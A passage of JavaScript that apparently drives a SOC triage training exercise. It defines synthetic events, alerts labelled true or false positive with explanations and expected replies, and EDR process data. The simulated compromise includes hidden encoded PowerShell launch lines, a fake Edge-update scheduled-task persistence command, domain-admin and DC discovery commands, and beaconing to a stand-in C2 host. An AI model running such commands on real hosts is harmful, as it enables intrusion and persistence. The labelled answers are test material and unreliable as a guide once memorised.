    E('e-321', '15:02:11', 'Auth', 'h-mailgw', 'EAS login failed', 'ActiveSync: login failed user=jsmith device=iPhone-JS src=203.0.113.88 reason=bad password (cached credential)', { app: 'ActiveSync', result: 'failed', device: 'iPhone-JS' }, { user: 'jsmith', src: '203.0.113.88' }),
    E('e-322', '15:05:11', 'Auth', 'h-mailgw', 'EAS login failed', 'ActiveSync: login failed user=jsmith device=iPhone-JS src=203.0.113.88 reason=bad password (cached credential)', { app: 'ActiveSync', result: 'failed', device: 'iPhone-JS' }, { user: 'jsmith', src: '203.0.113.88' }),
    E('e-323', '15:08:44', 'WinEvent', 'h-dc01', '4740 Account lockout', 'EventID=4740 A user account was locked out. TargetUserName=jsmith CallerComputerName=MAIL-GW01 (ActiveSync)', { code: '4740', caller: 'MAIL-GW01' }, { user: 'jsmith' }),
    E('e-324', '15:09:30', 'Auth', null, 'Device registered', 'Entra: device iPhone-JS is registered to jsmith (Intune compliant) first_seen=2025-03-02', { device: 'iPhone-JS' }, { user: 'jsmith' })
  ];
  // C2 beaconing (about every 60s with jitter) from the infected laptop
  for (let i = 0; i < 400; i++) {
    const t = 9 * 3600 + 39 * 60 + 20 + i * 61 + ((i * 7) % 5) - 2;
    if (t > 16 * 3600) break;
    const hh = String(Math.floor(t / 3600)).padStart(2, '0'), mm = String(Math.floor(t / 60) % 60).padStart(2, '0'), ss = String(t % 60).padStart(2, '0');
    ev.push(E('e-b' + String(i + 1).padStart(3, '0'), `${hh}:${mm}:${ss}`, 'Firewall', 'h-fin-031', 'Allow',
      `ALLOW TCP 10.20.4.31:${50877 + i} -> 198.51.100.23:443 bytes=${1100 + ((i * 37) % 300)} app=ssl session=keepalive`,
      { action: 'allow', dport: '443', domain: 'msupdate-cdn-check.example', c2: '1' }, { src: '10.20.4.31', dst: '198.51.100.23', user: 'hdoyle' }));
    if (i % 5 === 0) ev.push(E('e-d' + String(i + 1).padStart(3, '0'), `${hh}:${mm}:${ss}`, 'DNS', 'h-fin-031', 'DNS Query',
      'query: msupdate-cdn-check.example IN A from 10.20.4.31 -> 198.51.100.23 NOERROR', { domain: 'msupdate-cdn-check.example', answer: '198.51.100.23', c2: '1' }, { user: 'hdoyle', src: '10.20.4.31', dst: '198.51.100.23' }));
  }
  ev.push(E('e-251', '10:11:30', 'NDR', 'h-fin-031', 'Beacon analysis', 'NDR: periodic outbound sessions src=10.20.4.31 dst=198.51.100.23:443 interval=60s jitter=5% sessions=33 avg_out=1.2KB avg_in=0.9KB ja3=72a589da586844d7f0818ce684948eea sni=msupdate-cdn-check.example', { interval: '60s', sessions: '33', domain: 'msupdate-cdn-check.example' }, { src: '10.20.4.31', dst: '198.51.100.23' }));

  const ioc = (type, value) => ({ type, value });
  const alerts = [
    {
      id: 'A-1001', at: '08:04', title: 'Multiple failed logons followed by a successful logon', severity: 'low', source: 'SIEM', rule: 'AUTH-014 Failed logon burst + success', hostId: 'h-ops-007', userId: 'u-jsmith',
      summary: '4 failed interactive logons for jsmith within 2 minutes on OPS-WS-007, followed by a successful logon.',
      details: { 'Failed logons': '4', 'Window': '07:58 - 08:02', 'Account': 'jsmith', 'Logon type': '2 (Interactive)', 'Source': 'OPS-WS-007 (local console)' },
      eventIds: ['e-101', 'e-102', 'e-103', 'e-104', 'e-105', 'e-106'], iocs: [ioc('user', 'jsmith'), ioc('host', 'OPS-WS-007')], truth: 'FP',
      explain: 'Monday-morning forgotten password. A service desk password reset (4724 by sgreene, ticket INC0045122) landed between the failures and the successful logon, and everything came from the user\'s own workstation.',
      reply: { fp: 'The failures are all from his own desk, and Sophie on the service desk reset his password at 08:01 (4724, ticket INC0045122) right before the successful logon.' },
      keywords: ['failed', 'logon', 'jsmith', 'reset', '4625'],
      userReply: 'Ugh, yes. Forgot my password over the weekend. Sophie on the desk reset it for me.', helpdeskReply: 'Yep, I reset Jordan\'s password at 08:01 under INC0045122. Caller verified with employee ID.'
    },
    {
      id: 'A-1002', at: '08:21', title: 'Internal network scan detected', severity: 'medium', source: 'NDR', rule: 'NDR-221 Horizontal port scan', hostId: 'h-scan01',
      summary: 'Host 10.20.9.15 probed 214 internal hosts on ports 22/80/135/139/443/445/3389 in 5 minutes.',
      details: { 'Source': '10.20.9.15 (SCAN01)', 'Targets': '214 hosts', 'Ports': '22, 80, 135, 139, 443, 445, 3389', 'Duration': '5 min' },
      eventIds: ['e-115', 'e-111', 'e-112', 'e-113', 'e-114'], iocs: [ioc('ip', '10.20.9.15'), ioc('host', 'SCAN01')], truth: 'FP',
      explain: 'The scanner is SCAN01, the corporate Tenable server, running the authorized weekly credentialed scan (CHG-4466, Mon 08:00-10:00). It logged on with the svc-tenable account at 08:00.',
      reply: { fp: 'That source is SCAN01, our Tenable box. The weekly credentialed scan is on the change calendar (CHG-4466) and svc-tenable logged on at 08:00.' },
      keywords: ['scan', 'scan01', 'tenable', '10.20.9.15', 'port']
    },
    {
      id: 'A-1003', at: '08:37', title: 'PowerShell executed with -EncodedCommand', severity: 'high', source: 'EDR', rule: 'EDR-0210 Encoded PowerShell', hostId: 'h-it-004', userId: 'u-rpatel',
      summary: 'powershell.exe ran with a Base64-encoded command, ExecutionPolicy Bypass on IT-LT-004.',
      details: { 'Process': 'powershell.exe', 'Parent': 'CcmExec.exe', 'Flags': '-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand', 'Run as': 'SYSTEM', 'Signed parent': 'Yes (Microsoft)' },
      eventIds: ['e-121', 'e-122', 'e-123', 'e-124'], iocs: [ioc('host', 'IT-LT-004'), ioc('user', 'rpatel')], truth: 'FP',
      explain: 'This is the SCCM client (CcmExec.exe) running the Software Inventory baseline (CHG-4469). Script-block logging decodes the command to Get-CimInstance Win32_Product | Export-Csv to a share on SCCM01. It is a scary pattern with a completely legitimate parent and decoded content.',
      reply: { fp: 'Decoded the Base64: it is just Get-CimInstance Win32_Product exported to a CSV on SCCM01. Parent is CcmExec, so it is the SCCM compliance baseline from Ravi (CHG-4469).' },
      keywords: ['powershell', 'encoded', 'ccmexec', 'sccm', 'decoded', 'it-lt-004'], userReply: 'That would be the SCCM baseline I pushed to the IT group this morning.'
    },
    {
      id: 'A-1004', at: '08:52', title: 'User-reported suspicious email', severity: 'medium', source: 'Email GW', rule: 'MAIL-007 Report Phish button', hostId: 'h-fin-018', userId: 'u-ikaur',
      summary: 'ikaur reported a message with subject "Inderjit, you appeared in 9 searches this week".',
      details: { 'Sender': 'notifications-noreply@linkedin.com', 'Recipient': 'ikaur@halvorsenlogistics.com', 'Reported reason': 'looks suspicious', 'Attachments': '0' },
      eventIds: ['e-131', 'e-132', 'e-133'], iocs: [ioc('email', 'notifications-noreply@linkedin.com'), ioc('domain', 'linkedin.com')], truth: 'FP',
      explain: 'A genuine LinkedIn notification: SPF, DKIM and DMARC all pass for linkedin.com, and the gateway sandbox detonated all links to clean linkedin.com pages.',
      reply: { fp: 'SPF/DKIM/DMARC all pass for linkedin.com and the sandbox detonation of all three links came back clean. It is a legit LinkedIn digest.' },
      keywords: ['linkedin', 'spf', 'dkim', 'dmarc', 'clean', 'sandbox'], userReply: 'It just looked a bit salesy so I reported it, sorry!'
    },
    {
      id: 'A-1005', at: '09:05', title: 'Impossible travel: sign-ins from two cities', severity: 'medium', source: 'IAM', rule: 'IAM-031 Impossible travel', userId: 'u-mchen', hostId: 'h-sal-009',
      summary: 'mchen signed in from Oak Brook, IL at 08:12 and from Denver, CO at 08:58 (46 minutes apart).',
      details: { 'User': 'mchen', 'Location 1': 'Oak Brook, IL (198.51.100.77) 08:12', 'Location 2': 'Denver, CO (203.0.113.52) 08:58', 'Distance': '~920 miles', 'Risk': 'High (IAM)' },
      eventIds: ['e-141', 'e-142', 'e-143'], iocs: [ioc('ip', '203.0.113.52'), ioc('ip', '198.51.100.77'), ioc('user', 'mchen')], truth: 'FP',
      explain: 'The second sign-in is the user\'s registered, Intune-compliant iPhone using Outlook on a cellular connection; mobile carrier CGNAT egress geolocates to the wrong city. She is physically in the Oak Brook office on the corporate LAN.',
      reply: { fp: 'The Denver sign-in is her Intune-compliant iPhone on carrier data (CGNAT geolocates wrong). The Oak Brook one is her laptop on the office LAN.' },
      keywords: ['mchen', 'travel', 'iphone', 'mobile', 'compliant', 'carrier'], userReply: 'I\'m at my desk in Oak Brook. My phone is on cellular since I don\'t use the guest wifi.', helpdeskReply: 'Mei is in the office today. I saw her laptop at her desk this morning.'
    },
    {
      id: 'A-1006', at: '09:26', title: 'USB mass storage device connected', severity: 'low', source: 'EDR', rule: 'EDR-0510 Removable media', hostId: 'h-hr-003', userId: 'u-tosei',
      summary: 'A USB mass storage device was connected to HR-LT-003.',
      details: { 'Device': 'IronKey D300S (serial A1B2C3D4E5)', 'Host': 'HR-LT-003', 'User': 'tosei', 'Files copied': '0' },
      eventIds: ['e-151', 'e-152', 'e-153'], iocs: [ioc('host', 'HR-LT-003'), ioc('user', 'tosei')], truth: 'FP',
      explain: 'Corporate encrypted IronKey (asset tag HLG-USB-0192), allowlisted and issued to HR for payroll archive transfers. DLP policy allowed it and no files were copied.',
      reply: { fp: 'HLG-USB-0192 is a corp-issued encrypted IronKey on the allowlist, assigned to HR. DLP shows zero files copied.' },
      keywords: ['usb', 'ironkey', 'allowlist', 'encrypted', 'hr-lt-003'], helpdeskReply: 'HLG-USB-0192 is the HR payroll archive drive. It is encrypted and on the allowlist.', userReply: 'That is the HR encrypted drive, I use it for the monthly payroll archive.'
    },
    {
      id: 'A-1007', at: '09:41', title: 'Hidden PowerShell with encoded download cradle', severity: 'high', source: 'EDR', rule: 'EDR-0412 Script interpreter from user shell', hostId: 'h-fin-031', userId: 'u-hdoyle',
      summary: 'cmd.exe launched powershell.exe -w hidden -enc with an encoded command that downloads from an external domain on FIN-LT-031.',
      details: { 'Process': 'powershell.exe -w hidden -nop -ep bypass -enc', 'Parent chain': 'explorer.exe > cmd.exe > powershell.exe', 'User': 'CORP\\hdoyle', 'Destination': 'msupdate-cdn-check.example', 'Window': 'Hidden' },
      eventIds: ['e-201', 'e-203', 'e-206', 'e-207', 'e-208', 'e-209'], iocs: [ioc('domain', 'msupdate-cdn-check.example'), ioc('ip', '198.51.100.23'), ioc('domain', 'docs-brightline-billing.example'), ioc('email', 'billing@brightline-pkg-billing.example'), ioc('hash', LNK_SHA)], truth: 'TP', incident: 'INC-1',
      explain: 'TRUE POSITIVE. Hannah received a lookalike vendor invoice lure (SPF softfail, DMARC fail, link to a newly seen domain), downloaded a ZIP, ran a .pdf.lnk shortcut that spawned a hidden encoded PowerShell downloading stage 1 from a domain registered 2 days earlier. Unlike the SCCM encoded PowerShell earlier, the parent is a user shell (explorer > cmd), the window is hidden, and the destination is an unknown external domain.',
      reply: { tp: 'Phishing lure at 09:14 (SPF softfail, DMARC fail), ZIP from docs-brightline-billing.example, .lnk spawns hidden encoded PowerShell that fetches stage 1 from msupdate-cdn-check.example. That is initial access, and the rundll32 child looks like a beacon.', irTp: 'Lure to LNK to hidden encoded PowerShell and a fetch from a 2-day-old domain, then a rundll32 child with network. I\'m treating this as an active compromise of FIN-LT-031.' },
      keywords: ['powershell', 'encoded', 'hidden', 'download', 'msupdate', 'brightline', 'lnk', 'phish', 'invoice'],
      userReply: 'I did click an overdue invoice link from Brightline Packaging, they are one of our vendors. It gave me a zip and I opened the PDF inside but nothing really showed up.',
      helpdeskReply: 'Hannah just called saying a PDF "did nothing" after she opened an invoice zip. I told her not to open anything else.'
    },
    {
      id: 'A-1008', at: '09:58', title: 'Possible ransomware: mass file modification', severity: 'critical', source: 'EDR', rule: 'EDR-0901 Ransomware behavior (mass write)', hostId: 'h-fs02',
      summary: '18,442 files written per minute under D:\\Shares\\Finance\\ by robocopy.exe on FS02.',
      details: { 'Process': 'robocopy.exe', 'Account': 'CORP\\svc-migrate', 'Rate': '18,442 files/min', 'Path': 'D:\\Shares\\Finance\\', 'Host criticality': 'High' },
      eventIds: ['e-221', 'e-222', 'e-223', 'e-224'], iocs: [ioc('host', 'FS02')], truth: 'FP',
      explain: 'The FS01-to-FS02 share migration (CHG-4471) started at 09:30. robocopy /MIR run by svc-migrate from the approved change, no new file extensions, normal entropy, no ransom notes, no shadow copy deletion.',
      reply: { fp: 'It is the approved share migration (CHG-4471, Chidi). robocopy /MIR from FS01 by svc-migrate, no new extensions, normal entropy, no ransom notes, no shadow deletion.' },
      keywords: ['robocopy', 'migration', 'chg-4471', 'svc-migrate', 'fs02', 'extension'], helpdeskReply: 'Chidi is migrating the departmental shares to FS02 this morning, CHG-4471. He warned us about it.'
    },
    {
      id: 'A-1009', at: '10:03', title: 'Access to a domain never seen before', severity: 'medium', source: 'Proxy', rule: 'PRX-044 New domain first seen', hostId: 'h-ops-012', userId: 'u-dkowal',
      summary: 'OPS-WS-012 browsed freightcalc-tools.example, a domain with no prior history in this environment.',
      details: { 'Domain': 'freightcalc-tools.example', 'Category': 'Uncategorized (newly seen)', 'Requests': '3', 'User': 'dkowal' },
      eventIds: ['e-231', 'e-232', 'e-233', 'e-234'], iocs: [ioc('domain', 'freightcalc-tools.example'), ioc('ip', '192.0.2.88')], truth: 'FP',
      explain: 'A carrier emailed Dorota a link to their freight-rate calculator (email e-234 at 09:55). Domain is 9 years old with no detections and the requests are normal quote lookups; no downloads, no uploads.',
      reply: { fp: 'A carrier emailed her this calculator at 09:55, and the domain is nine years old with no detections. Only quote lookups, no downloads.' },
      keywords: ['freightcalc', 'carrier', 'email', 'domain', 'dkowal'], userReply: 'Yes, a carrier sent me their rate calculator link to quote a lane. It\'s legit.'
    },
    {
      id: 'A-1010', at: '10:12', title: 'Periodic outbound beaconing to rare external host', severity: 'medium', source: 'NDR', rule: 'NDR-310 Beacon behavior', hostId: 'h-fin-031', userId: 'u-hdoyle',
      summary: 'FIN-LT-031 has made 33 regular ~60s sessions to 198.51.100.23:443 with low jitter.',
      details: { 'Source': 'FIN-LT-031 (10.20.4.31)', 'Destination': '198.51.100.23:443 (msupdate-cdn-check.example)', 'Interval': '60s, 5% jitter', 'Sessions': '33', 'Avg bytes out/in': '1.2KB / 0.9KB', 'JA3': '72a589da586844d7f0818ce684948eea' },
      eventIds: ['e-210', 'e-b010', 'e-b020', 'e-b030', 'e-251'], iocs: [ioc('ip', '198.51.100.23'), ioc('domain', 'msupdate-cdn-check.example')], truth: 'TP', incident: 'INC-1',
      explain: 'TRUE POSITIVE (second alert of INC-1). Command-and-control beaconing from the compromised laptop, beginning seconds after the encoded PowerShell ran. Same host and same destination as A-1007.',
      reply: { tp: 'That beacon starts right after the encoded PowerShell on the same laptop, same destination, 60s interval. It is the C2 channel for the same incident, I\'ve linked it.', irTp: 'Regular 60s sessions to the same domain the PowerShell pulled from. C2 confirmed.' },
      keywords: ['beacon', '198.51.100.23', 'msupdate', 'fin-lt-031', 'interval', 'c2']
    },
    {
      id: 'A-1011', at: '10:30', title: 'Local Administrators group membership changed', severity: 'low', source: 'SIEM', rule: 'AD-120 Local admin change', hostId: 'h-wh-002', userId: 'u-lcastro',
      summary: 'CORP\\lcastro was added to the local Administrators group on WH-WS-002 by CORP\\sgreene.',
      details: { 'Group': 'Administrators', 'Added': 'CORP\\lcastro', 'Changed by': 'CORP\\sgreene', 'Host': 'WH-WS-002' },
      eventIds: ['e-241', 'e-242', 'e-243'], iocs: [ioc('user', 'sgreene'), ioc('user', 'lcastro'), ioc('host', 'WH-WS-002')], truth: 'FP',
      explain: 'Approved temporary local admin for 24h to install a label printer driver (INC0045140, approved by the COO), done remotely by IT support analyst sgreene.',
      reply: { fp: 'INC0045140: 24h local admin for a label printer driver, approved by Callum and done by Sophie from IT. Normal.' },
      keywords: ['administrators', 'sgreene', 'lcastro', 'inc0045140', 'approved'], helpdeskReply: 'INC0045140, temp admin for the label printer driver at the Joliet DC. Callum approved it. I\'ll remove it tomorrow.'
    },
    {
      id: 'A-1012', at: '10:55', title: 'High volume of DNS TXT queries (possible tunneling)', severity: 'medium', source: 'NDR', rule: 'NDR-118 DNS TXT volume', hostId: 'h-mailgw',
      summary: 'MAIL-GW01 issued 1,420 TXT queries to 611 unique domains in 5 minutes.',
      details: { 'Source': 'MAIL-GW01 (10.20.1.30)', 'Query type': 'TXT', 'Count': '1420 / 5m', 'Unique domains': '611', 'Max label length': '28', 'Avg entropy': '2.9 (low)' },
      eventIds: ['e-271', 'e-272', 'e-273', 'e-274', 'e-275'], iocs: [ioc('host', 'MAIL-GW01')], truth: 'FP',
      explain: 'The mail gateway performs SPF/DKIM/DMARC lookups (all TXT records) for each inbound message. Monday morning is the peak (2,180 msgs/5m), labels are short, entropy is low, and every domain resolves to a valid sender. No long encoded labels as DNS tunneling would use.',
      reply: { fp: 'Mail gateway SPF/DKIM/DMARC lookups are TXT queries. Monday peak mail volume, short low-entropy labels, all valid domains. Not tunneling.' },
      keywords: ['txt', 'spf', 'dkim', 'dmarc', 'mail', 'mail-gw01', 'entropy']
    },
    {
      id: 'A-1013', at: '11:30', title: 'Scheduled task created from user profile path', severity: 'high', source: 'EDR', rule: 'EDR-0633 Persistence via scheduled task', hostId: 'h-fin-031', userId: 'u-hdoyle',
      summary: 'A task named MicrosoftEdgeUpdateTaskCore was created pointing to an unsigned binary in %APPDATA%.',
      details: { 'Task': '\\Microsoft\\Windows\\Edge\\MicrosoftEdgeUpdateTaskCore', 'Command': 'C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe', 'Trigger': 'At logon, highest privileges', 'Signed': 'No', 'Created by': 'schtasks.exe (parent rundll32.exe)', 'Also seen': 'net group "Domain Admins" /domain, nltest /dclist' },
      eventIds: ['e-261', 'e-262', 'e-263', 'e-264', 'e-265', 'e-266'], iocs: [ioc('hash', EXE_SHA), ioc('host', 'FIN-LT-031')], truth: 'TP', incident: 'INC-1',
      explain: 'TRUE POSITIVE (third alert of INC-1). Persistence via a fake Edge update task running an unsigned binary from AppData, created by the injected rundll32 beacon, followed by Domain Admins and DC enumeration. Real Edge updates are signed and live under Program Files (x86).',
      reply: { tp: 'Fake Edge-updater task pointing at an unsigned exe in AppData, created by the rundll32 beacon, plus domain admin enumeration. This is persistence and discovery within the same incident.', irTp: 'Persistence plus domain recon from the compromised laptop. I am scoping for credential theft and lateral movement now.' },
      keywords: ['scheduled', 'task', 'persistence', 'msedgeupdate', 'unsigned', 'appdata', 'domain admins']
    },
    {
      id: 'A-1014', at: '12:20', title: 'Excessive HTTP 404 responses from single IP', severity: 'low', source: 'SIEM', rule: 'WEB-022 404 burst', hostId: 'h-web01',
      summary: '61 HTTP 404 responses to 198.51.100.99 on WEB01 in 20 minutes.',
      details: { 'Client IP': '198.51.100.99', 'Path': '/status', '404 count': '61', 'User-Agent': 'PingMonitor/2.1' },
      eventIds: ['e-281', 'e-282', 'e-283', 'e-284', 'e-285'], iocs: [ioc('ip', '198.51.100.99')], truth: 'FP',
      explain: 'An external uptime monitor still polling the old /status path after the portal release moved it to /healthz (CHG-4472 at 11:05). The only 404s are for /status and every other request succeeds.',
      reply: { fp: 'It is an uptime monitor (PingMonitor) hammering /status, which was renamed to /healthz in this morning\'s release (CHG-4472). I\'ll tell Ravi to update the monitor.' },
      keywords: ['404', 'status', 'pingmonitor', 'healthz', 'chg-4472', '198.51.100.99']
    },
    {
      id: 'A-1015', at: '13:05', title: 'Mailbox auto-forward rule created', severity: 'medium', source: 'IAM', rule: 'M365-050 New forwarding rule', userId: 'u-aflores', hostId: 'h-cs-014',
      summary: 'aflores created an inbox rule forwarding all mail to another address.',
      details: { 'Operation': 'New-InboxRule', 'Rule': 'OOO coverage', 'Forward to': 'tbrooke@halvorsenlogistics.com', 'Client IP': '10.20.10.14' },
      eventIds: ['e-293', 'e-291', 'e-292'], iocs: [ioc('email', 'tbrooke@halvorsenlogistics.com'), ioc('user', 'aflores')], truth: 'FP',
      explain: 'The forward target is an internal teammate, an out-of-office auto-reply was scheduled in the same minute, and the user signed in from her own compliant workstation on the corporate network.',
      reply: { fp: 'Forwarding goes to an internal colleague (Tamsin), an OOO auto-reply was set up in the same minute, and the sign-in is from her own compliant PC on the office LAN. Standard coverage rule.' },
      keywords: ['forward', 'inbox', 'rule', 'internal', 'ooo', 'aflores'], userReply: 'I\'m off to a trade show tomorrow. Tamsin covers my customer mail.'
    },
    {
      id: 'A-1016', at: '13:40', title: 'Brute force: 60+ failed VPN logins from one IP', severity: 'high', source: 'FW', rule: 'VPN-005 Brute force', hostId: 'h-vpn01',
      summary: '63 failed GlobalProtect logins from 203.0.113.150 across 19 usernames in 15 minutes.',
      details: { 'Source IP': '203.0.113.150', 'Failed': '63', 'Successful': '0', 'Distinct usernames': '19', 'Valid directory users': '0' },
      eventIds: ['e-301', 'e-302', 'e-303', 'e-304'], iocs: [ioc('ip', '203.0.113.150')], truth: 'FP',
      explain: 'Internet background noise: a mass scanner guessing generic usernames (admin, backup...). None of the 19 usernames are real directory users, there were zero successes and zero lockouts.',
      reply: { fp: 'Generic internet credential guessing: zero successes, none of the usernames exist in the directory and no lockouts. That IP is a known mass scanner. Block it if you like, but there is nothing to investigate.' },
      keywords: ['vpn', 'brute', '203.0.113.150', 'failed', 'success', 'usernames']
    },
    {
      id: 'A-1017', at: '14:30', title: 'Large upload to personal cloud storage', severity: 'low', source: 'DLP', rule: 'DLP-203 Large cloud upload', hostId: 'h-mkt-005', userId: 'u-bnguyen',
      summary: 'MKT-WS-005 uploaded 2.1 GB to dropbox.com.',
      details: { 'Destination': 'content.dropbox.com', 'Size': '2.1 GB', 'File': 'Q4_Product_Promo_Final.mp4', 'Classification': 'Public' },
      eventIds: ['e-311', 'e-312', 'e-313'], iocs: [ioc('domain', 'dropbox.com'), ioc('user', 'bnguyen')], truth: 'FP',
      explain: 'A marketing video classified Public and sourced from the Marketing\\Public share, uploaded by a marketing coordinator to share with an agency. DLP found no sensitive patterns.',
      reply: { fp: 'Public-labelled promo video from the Marketing\\Public share, no sensitive patterns per DLP. Marketing shares it with their agency via Dropbox.' },
      keywords: ['dropbox', 'upload', 'public', 'marketing', 'mp4', 'dlp'], userReply: 'Yes, the Q4 promo video. The agency needs it for the campaign.'
    },
    {
      id: 'A-1018', at: '15:10', title: 'Account lockout: jsmith', severity: 'medium', source: 'SIEM', rule: 'AUTH-030 Account lockout', hostId: 'h-dc01', userId: 'u-jsmith',
      summary: 'jsmith was locked out after repeated failed ActiveSync logins.',
      details: { 'Account': 'jsmith', 'Caller': 'MAIL-GW01 (ActiveSync)', 'Failures': '6', 'Source IP': '203.0.113.88' },
      eventIds: ['e-321', 'e-322', 'e-323', 'e-324'], iocs: [ioc('user', 'jsmith'), ioc('ip', '203.0.113.88')], truth: 'FP',
      explain: 'Jordan\'s iPhone is still using the old cached password after this morning\'s reset (see A-1001). The device is registered and Intune-compliant; the source is his phone on carrier data.',
      reply: { fp: 'It is his registered iPhone retrying ActiveSync with the old cached password after the 08:01 reset, so the account locks every few minutes. Have him update the phone password.' },
      keywords: ['lockout', 'jsmith', 'activesync', 'iphone', 'password', 'reset'], userReply: 'My phone keeps asking for a password, I haven\'t updated it since the reset this morning.', helpdeskReply: 'Probably his phone with the old password. I\'ll walk him through it.'
    }
  ];

  const edr = {
    'h-fin-031': {
      processes: [
        { pid: 5120, ppid: 0, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'CORP\\hdoyle', start: '07:41:10', signed: true, publisher: 'Microsoft Corporation', flag: null },
        { pid: 5388, ppid: 5120, name: 'OUTLOOK.EXE', cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', user: 'CORP\\hdoyle', start: '07:42:00', signed: true, publisher: 'Microsoft Corporation', flag: null },
        { pid: 6012, ppid: 5120, name: 'chrome.exe', cmd: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', user: 'CORP\\hdoyle', start: '08:03:20', signed: true, publisher: 'Google LLC', flag: null },
        { pid: 7340, ppid: 5120, name: 'cmd.exe', cmd: 'C:\\Windows\\System32\\cmd.exe /c powershell.exe -w hidden -nop -ep bypass -enc ' + ENC, user: 'CORP\\hdoyle', start: '09:38:44', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Launched from an LNK in the Downloads folder (mark-of-the-web ZIP)' },
        { pid: 7388, ppid: 7340, name: 'powershell.exe', cmd: 'powershell.exe -w hidden -nop -ep bypass -enc ' + ENC, user: 'CORP\\hdoyle', start: '09:38:46', signed: true, publisher: 'Microsoft Corporation', flag: 'malicious', note: 'Decoded: ' + STAGE1 },
        { pid: 7512, ppid: 7388, name: 'rundll32.exe', cmd: 'C:\\Windows\\System32\\rundll32.exe', user: 'CORP\\hdoyle', start: '09:40:12', signed: true, publisher: 'Microsoft Corporation', flag: 'malicious', note: 'No command line, injected code, periodic outbound connections to 198.51.100.23' },
        { pid: 8044, ppid: 7512, name: 'schtasks.exe', cmd: 'schtasks.exe /create /tn "\\Microsoft\\Windows\\Edge\\MicrosoftEdgeUpdateTaskCore" /tr "C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe" /sc onlogon /rl highest /f', user: 'CORP\\hdoyle', start: '11:12:08', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Persistence created from injected process' },
        { pid: 8210, ppid: 7512, name: 'cmd.exe', cmd: 'cmd.exe /c net group "Domain Admins" /domain', user: 'CORP\\hdoyle', start: '11:24:30', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Discovery' },
        { pid: 8244, ppid: 8210, name: 'nltest.exe', cmd: 'nltest.exe /dclist:corp', user: 'CORP\\hdoyle', start: '11:26:10', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Discovery' }
      ],
      connections: [
        { t: '09:31:08', pid: 6012, proc: 'chrome.exe', dst: '203.0.113.45:443', domain: 'docs-brightline-billing.example', proto: 'TCP' },
        { t: '09:38:51', pid: 7388, proc: 'powershell.exe', dst: '198.51.100.23:443', domain: 'msupdate-cdn-check.example', proto: 'TCP' },
        { t: '09:40:20', pid: 7512, proc: 'rundll32.exe', dst: '198.51.100.23:443', domain: 'msupdate-cdn-check.example', proto: 'TCP' },
        { t: '09:41:21', pid: 7512, proc: 'rundll32.exe', dst: '198.51.100.23:443', domain: 'msupdate-cdn-check.example', proto: 'TCP' },
        { t: '09:42:22', pid: 7512, proc: 'rundll32.exe', dst: '198.51.100.23:443', domain: 'msupdate-cdn-check.example', proto: 'TCP' },
        { t: '10:12:00', pid: 7512, proc: 'rundll32.exe', dst: '198.51.100.23:443', domain: 'msupdate-cdn-check.example', proto: 'TCP' },
        { t: '11:12:30', pid: 7512, proc: 'rundll32.exe', dst: '198.51.100.23:443', domain: 'msupdate-cdn-check.example', proto: 'TCP' }
      ],
      files: [
        { t: '09:33:40', pid: 6012, op: 'create', path: 'C:\\Users\\hdoyle\\Downloads\\INV-77-2210.zip', sha256: '' },
        { t: '09:37:02', pid: 5120, op: 'create', path: 'C:\\Users\\hdoyle\\Downloads\\INV-77-2210\\Invoice_77-2210.pdf.lnk', sha256: LNK_SHA },
        { t: '11:12:05', pid: 7512, op: 'create', path: 'C:\\Users\\hdoyle\\AppData\\Roaming\\Microsoft\\Edge\\msedgeupdate.exe', sha256: EXE_SHA }
      ]
    },
    'h-it-004': {
      processes: [
        { pid: 3010, ppid: 0, name: 'CcmExec.exe', cmd: 'C:\\Windows\\CCM\\CcmExec.exe', user: 'NT AUTHORITY\\SYSTEM', start: '07:20:05', signed: true, publisher: 'Microsoft Corporation', flag: null, note: 'SCCM / ConfigMgr client' },
        { pid: 6204, ppid: 3010, name: 'powershell.exe', cmd: 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ' + b64u16("Get-CimInstance Win32_Product | Select Name,Version | Export-Csv \\\\SCCM01\\hwinv$\\IT-LT-004.csv -NoTypeInformation"), user: 'NT AUTHORITY\\SYSTEM', start: '08:34:50', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Decoded: Get-CimInstance Win32_Product | Select Name,Version | Export-Csv \\\\SCCM01\\hwinv$\\IT-LT-004.csv' }
      ],
      connections: [{ t: '08:35:10', pid: 6204, proc: 'powershell.exe', dst: '10.20.1.40:445', domain: 'SCCM01', proto: 'TCP' }],
      files: [{ t: '08:35:10', pid: 6204, op: 'create', path: '\\\\SCCM01\\hwinv$\\IT-LT-004.csv', sha256: '' }]
    },
    'h-fs02': {
      processes: [
        { pid: 4412, ppid: 0, name: 'powershell.exe', cmd: 'powershell.exe -File D:\\scripts\\migrate-shares.ps1', user: 'CORP\\svc-migrate', start: '09:30:01', signed: true, publisher: 'Microsoft Corporation', flag: null },
        { pid: 4468, ppid: 4412, name: 'robocopy.exe', cmd: 'robocopy \\\\FS01\\Shares D:\\Shares /MIR /COPY:DATSOU /MT:32 /R:1 /W:1 /LOG:D:\\logs\\mig.log', user: 'CORP\\svc-migrate', start: '09:30:06', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Mass file write (18k files/min). Source is \\\\FS01 mirror; extensions unchanged.' }
      ],
      connections: [{ t: '09:30:07', pid: 4468, proc: 'robocopy.exe', dst: '10.20.1.21:445', domain: 'FS01', proto: 'TCP' }],
      files: [{ t: '09:52:10', pid: 4468, op: 'create', path: 'D:\\Shares\\Finance\\AP\\2026\\Oct\\vendor_statement_0231.xlsx', sha256: '' }, { t: '09:52:11', pid: 4468, op: 'create', path: 'D:\\Shares\\Finance\\AP\\2026\\Oct\\vendor_statement_0232.xlsx', sha256: '' }, { t: '09:52:11', pid: 4468, op: 'create', path: 'D:\\Shares\\Finance\\Payroll\\2026\\Oct\\run_summary.pdf', sha256: '' }]
    }
  };

  const intel = {
